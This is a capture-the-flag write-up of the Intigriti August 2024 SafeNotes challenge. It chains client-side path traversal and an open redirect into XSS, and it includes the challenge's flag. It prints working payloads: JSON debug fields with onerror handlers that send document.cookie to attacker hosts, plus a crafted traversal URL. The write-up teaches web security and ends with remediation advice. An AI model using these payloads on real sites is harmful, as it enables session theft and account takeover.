# Title: Client-Side Path Traversal and Open Redirect Chained to XSS

- **Platform**: Intigriti
- **Program**: Intigriti August 2024 CTF Challenge (Defcon Edition) - SafeNotes
- **Severity**: Critical
- **Date**: 2024-08-15
- **Researcher**: Various (Benjamin Stienlet, Stealthcopter, memosec)
- **Bounty**: N/A (CTF challenge)

## Summary
A complex client-side path traversal vulnerability was chained with an open redirect to achieve cross-site scripting (XSS) in the SafeNotes web application. The attack forced the bot (admin) to fetch attacker-controlled JSON that contained an unsanitized debug field, leading to cookie exfiltration.

## Technical Details
The SafeNotes application had a note-reporting feature where a bot would visit user-submitted URLs. The application enforced that only valid note view URLs could be reported, but the server-side validation was insufficient.

Three vulnerabilities were chained:
1. **Client-Side Path Traversal (CSPT)**: The note ID parameter was checked for `../` on the client side (`if (noteId.includes("../"))`), but the check could be bypassed using backslashes (`..\`) on Windows-based backends.
2. **Open Redirect**: The `/contact` endpoint had a `return` parameter that would redirect users. The `is_safe_url()` check passed URLs starting with `http`.
3. **Stored XSS via Debug Field**: The note-fetching function checked for a `debug` field in the JSON response. If present and truthy, the debug content was rendered directly as HTML without DOMPurify sanitization.

The attack path: The CSPT forced the client to fetch `../../../../contact?return=http://attacker-server/` which the open redirect followed. The attacker server returned a crafted JSON with a `debug` field containing a malicious script.

## Steps to Reproduce
1. Set up an attacker server that returns JSON: `{"debug": "<img src=x onerror=\"fetch('http://attacker/?cookie='+document.cookie)\">"}`
2. Craft the malicious URL: `https://challenge-0824.intigriti.io/view?note=..\..\..\..\..\contact?return=http://attacker-server/UUID`
3. Submit this URL to the report endpoint
4. The bot visits the URL, triggers CSPT, follows redirect, loads attacker JSON
5. The debug field renders, XSS fires, cookies are exfiltrated

## Proof of Concept
Crafted URL:
```
https://challenge-0824.intigriti.io/view?note=..\..\..\..\..\contact?return=https://attacker.com/550e8400-e29b-41d4-a716-446655440000
```

Attacker server response:
```json
{
  "debug": "<img src=x onerror=\"window.location='https://attacker.com/s?'+btoa(document.cookie)\">"
}
```

Returns the flag: `INTIGRITI{1337uplivectf_151124_54v3_7h3_d473}`

## Impact
- Complete exfiltration of the bot's cookies
- The cookie contained the flag
- Demonstrated how client-side path traversal + open redirect can completely bypass XSS sanitization

## Remediation
The fix involved:
1. Properly validating note IDs on the server side, not just client-side
2. Removing or securing the open redirect in the contact endpoint
3. Ensuring debug fields are never rendered without sanitization

## References
- https://gist.github.com/BenjaminStienlet/6349588b2049ae0338bab806c7c9b77e
- https://sec.stealthcopter.com/intigriti-august-2024-ctf/
- https://blog.antoniusblock.net/posts/intigriti-08-2024-challenge/
